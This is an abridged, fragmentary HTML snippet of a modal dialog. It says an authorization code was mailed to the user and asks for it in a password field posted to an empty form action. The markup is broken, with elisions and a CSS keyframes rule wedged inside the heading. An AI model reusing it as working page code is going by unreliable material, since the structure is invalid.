    ...
    <div class="modal-dialog">
        ...
        <div class="modal-content">
            ...
            <div class="modal-header">
              ...
              <div align=center>  <h4 class="modal-title"><br>An authorization code was sent to your mail. <br>use the code below to confirm login.<font size=2 color=#040359></font>.<br>
...
@-webkit-keyframes mymove {
    ...
    to {opacity: 1;}
                    ...
                    <font size=2 class=blinking color=#34633e></font><br></h4>
                    <form action="" method="post">
                    <input type=password name="otpl" placeholder="CODE"><br><br>
